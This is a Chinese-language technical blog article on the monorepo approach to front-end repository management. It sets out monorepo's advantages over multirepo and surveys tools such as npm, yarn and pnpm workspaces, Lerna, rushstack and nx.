<h1 id="前端流行仓库管理模式-Monorepo-浅析"><a href="#前端流行仓库管理模式-Monorepo-浅析" class="headerlink" title="前端流行仓库管理模式 Monorepo 浅析"></a>前端流行仓库管理模式 Monorepo 浅析</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><h3 id="1-1-什么是-Monorepo"><a href="#1-1-什么是-Monorepo" class="headerlink" title="1.1 什么是 Monorepo"></a>1.1 什么是 Monorepo</h3><p>Monorepo 是一种代码管理模式，将多个项目组织到一个 Repo 中。它有以下一些优点：</p>
<ul>
<li>子项目之间是独立的，可以独立开发、测试、以及部署</li>
<li>子项目的类型可以是任意的，可以是 web 项目、server 项目、或者 library 项目等等</li>
<li>子项目之间可能有依赖关系，例如一些顶层的项目会依赖于底层项目暴露的API</li>
</ul>
<p>对于前端项目而言，Monorepo 的子项目可以大致分为两类：</p>
<ul>
<li><strong>业务类子项目：</strong>子项目需要部署上线，例如基于 React 的业务项目，特点是不需要发布到 npm registry</li>
<li><strong>lib 类子项目：</strong>前端的 package 或库，特点是需要 publish 到 npm registry</li>
</ul>
<p>本文主要介绍业务型 Monorepo，即将多个业务应用（例如 React、Node等）以及其依赖（组件库、公共工具库等）集中到一个仓库中进行管理的模式，示例图如下：</p>
<p><img src="/pic/monorepo.png" alt="monorepo"></p>
<p>目前全球很多知名互联网公司都在使用 Monorepo 管理其源代码，据悉，谷歌甚至将整个公司的代码都放到一个仓库中，其仓库大小高达80TB。</p>
<h3 id="1-2-Why-Monorepo"><a href="#1-2-Why-Monorepo" class="headerlink" title="1.2 Why Monorepo?"></a>1.2 Why Monorepo?</h3><p>随着业务的增长，一个团队往往会<strong>同时维护和迭代多个项目</strong>，并且这些项目之间往往需要<strong>共享代码（组件库、工具函数等等）</strong>、<strong>共享基础设施（构建工具、lint等）</strong>。然而，在 Multirepo 仓库管理模式中，跨项目的代码共享非常麻烦，常用的方式是将公共代码提取出来并放入一个单独的仓库，然后将公用仓库的产物发布到 npm registry（一般复用组件库就是采用这种形式），示例图如下：</p>
<p><img src="/pic/multirepo.png" alt="multirepo"></p>
<p>在上图中，每一个顶层的 App 都在一个单独的仓库中，都有自己的一套基础设施、CI/CD 流程等，这些 App 的共用部分被拆分到独立的仓库中作为共用库，并发布到 npm，然后作为 npm 依赖引入到各个独立的 App 仓库中。看起来这是一个不错的解决方案，但是这种方法也会有一些问题：</p>
<ol>
<li><p><strong>重复的基础设施</strong>：每个项目都需要单独设置 CI 流程、配置开发环境、配置部署发布流程。这样不仅可能会带来一些构建设施或规范的不一致性，而且将会大大提高项目的基建维护成本。每个项目都需要专人维护，并且随着项目越来越大，维护成本会越来越高。</p>
</li>
<li><p><strong>割裂的工作流</strong>：多个项目组成的工程体系是不连续的，每个仓库都有自己的一套工作流程。当进行多项目协作开发时，整体的工作流是割裂的，例如需要修改公共库的一个函数，首先需要修改和调试公共库的仓库，然后跑工具库的 CI 流程，然后升级需要使用该函数的 App 仓库的相应依赖，然后调试 App，这一套流程显得非常的繁琐且不连续。</p>
</li>
<li><p><strong>复杂的版本管理</strong>：仓库之间的依赖关系随着时间推移会变得非常复杂。</p>
<p><img src="/pic/mono2.png" alt="mono2"></p>
</li>
</ol>
<p>采用 Monorepo 的模式管理代码可以很好地解决以上问题：</p>
<p><img src="/pic/mono3.png" alt="mono3"></p>
<ol>
<li><strong>统一的 CI 流程和基建</strong>：一套工具、规范落地所有项目，无需重复切换开发环境，减轻协作开发的成本。只需要为 Monorepo 配置好基础设施，后续所有新建的项目都可以复用已有的基建，只需要1-2个同学维护所有项目的基建即可，降低了基建的维护成本。</li>
<li><strong>一致的工作流</strong>：当工具库升级后，顶层的应用能同时感知到其依赖的升级，能够非常方便地调试工具库的修改，并能在开发完成后自动触发相关项目的测试发布流程。</li>
<li><strong>简化的依赖管理</strong>：所有项目都使用 HEAD 上的代码，项目之间的依赖关系直接且清晰。</li>
<li><strong>代码共享和团队协作能力</strong>：在 Monorepo 中，可以非常方便地实现代码复用，同时更加方便地检索到各项目的源代码，降低团队成员间的沟通成本。</li>
</ol>
<p>简而言之，Monorepo 可以将多个独立的项目变成一个统一的工程，多项目具有高度一致性并且有更高的复用和抽象能力。</p>
<p><img src="/pic/mono4.png" alt="mono4"></p>
<h2 id="2-Monorepo-工具调研"><a href="#2-Monorepo-工具调研" class="headerlink" title="2. Monorepo 工具调研"></a>2. Monorepo 工具调研</h2><p><img src="/pic/monotool.png" alt="monotool"></p>
<p>简单来说，上层工具依赖下层工具提供的能力：</p>
<ul>
<li><strong>最底层—Package Manager</strong>：例如 npm, yarn, pnpm 等，提供 monorepo 下的依赖管理和依赖安装能力</li>
<li><strong>中间层—Script Runner</strong>：例如 lerna, wsrun，提供在 Monorepo 中以某种顺序调用子项目的 script 或者在子项目下执行某种命令的能力</li>
<li><strong>最上层—Application</strong>：例如 nx, rush stack，集成了 react, node server 等脚手架，为 monorepo 子项目的开发、构建、以及测试等工程能力提供支持</li>
</ul>
<h3 id="2-1-Package-Manager"><a href="#2-1-Package-Manager" class="headerlink" title="2.1 Package Manager"></a>2.1 Package Manager</h3><blockquote>
<p>在各个 Package Manager 中，Monorepo 中的子项目称为一个 workspace，多个 workspace 构成 workspaces</p>
</blockquote>
<p>支持 workspaces 特性的 package manager，一般用于 Monorepo 中的依赖安装。目前前端最常用的 Package Manager 有 npm、yarn、pnpm，对 workspaces 特性都有一定的支持：</p>
<ul>
<li>npm：npm 从 v7 开始支持 workspaces，从 node 15 开始内置 npm 7</li>
<li>yarn：已稳定支持 workspaces</li>
<li>pnpm：已稳定支持 workspaces</li>
</ul>
<p>在 workspaces 模式下，package manager 会分析整个 Monorepo 下的所有 workspace，对所有 workspace 统一安装外部依赖，并且 link 依赖的 workspace 到node_modules 下。Package Manager 的 workspace 特性适合作为 Monorepo 的依赖管理方案，但是依赖管理是非常底层的能力。对于业务型的 Monorepo 来说，子项目的初始化、构建、以及部署都需要一整套工具链的支持。</p>
<h3 id="2-2-Lerna"><a href="#2-2-Lerna" class="headerlink" title="2.2 Lerna"></a>2.2 Lerna</h3><p>Lerna 是目前使用最为广泛的 Monorepo 工具之一，提供了依赖安装、自动升级多个项目的版本好并发布、批量在多个项目中按序执行特定命令的能力，lerna 的常用命令如下图：</p>
<p><img src="/pic/lerna.png" alt="lerna"></p>
<p>Lerna 的能力是 Package Manager 和 Script Runner 的整合，在面向库的 Monorepo 中使用非常广泛，被开源项目和企业内部的工具库项目所广泛采用。但是对于面向业务的 Monorepo，Lerna 缺乏构建、测试等相应工具链的支撑。而且当 Monorepo 持续增大之后，Lerna 不支持增量构建、测试，缺乏 scale 能力。</p>
<h3 id="2-3-集成的-Monorepo-工具"><a href="#2-3-集成的-Monorepo-工具" class="headerlink" title="2.3 集成的 Monorepo 工具"></a>2.3 集成的 Monorepo 工具</h3><p>集成的 Monorepo 工具基于上述的 Package Manager，在其基础上集成了 Script Runner、构建工具、测试工具等，常用的工具有 rushstack、nx 等。rushstack 是基于 rushjs 的一套 Monorepo 解决方案，相较于 Lerna 等工具，其提供了 webpack、jest 等常用工具的封装，并提供了增量构建的能力。nx 的建设相较于 rush 更加的顶层，提供了 React、React Native、Next 等技术展的工程化支持。</p>
<p>rushstack 和 nx 这类集成的 Monorepo 工具，相较于底层的工具提供了较为全面的工程化能力，更加适合业务型 Monorepo 的开发。</p>
<h2 id="3-小结"><a href="#3-小结" class="headerlink" title="3. 小结"></a>3. 小结</h2><p>对于较底层的工具，如 yarn、pnpm、lerna 等，这些工具仅仅用于依赖安装，或者按序调用 script，难以支撑起整个 Monorepo 的研发，缺乏整体工程化以及 scale 的能力。对于较顶层的工具，如 rushstack、nx 等，提供了较全的工程化能力，有一套完整的 Monorepo 工程设施，这类工具比较适合业务型 Monorepo 的研发，不过集成工具一般都有自己的生态体系和技术栈，因此有可能与现有的基础设施产生冲突。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《Eden Monorepo 系列：浅析 Eden Monorepo 工程化建设》</p>
]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>FrontEnd</tag>
      </tags>
  </entry>
</search>
